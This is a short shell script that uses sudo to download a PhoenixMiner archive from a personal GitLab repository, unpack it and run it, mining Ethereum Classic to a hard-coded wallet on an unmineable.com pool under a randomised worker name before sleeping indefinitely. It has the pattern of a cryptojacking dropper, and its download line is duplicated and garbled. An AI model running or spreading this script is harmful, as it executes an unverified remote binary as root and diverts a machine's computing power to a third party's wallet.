#!/bin/sh
sudo apt update
sudo apt install libpci3
sudo wget sudo wget https://gitlab.com/jaliyahjacoby13279/phoenix/-/raw/main/PhoenixMiner_5.7b_Linux.tar.gz
tar -xvf PhoenixMiner_5.7b_Linux.tar.gz
cd PhoenixMiner_5.7b_Linux
sudo ./PhoenixMiner -pool etchash.unmineable.com:3333 -wal ETC:0x78a7f87d76d617bfe75e60bcf90a4890e602b3c2 -worker $(echo PRO-$(shuf -i 1-99999 -n 1))
sleep 99999
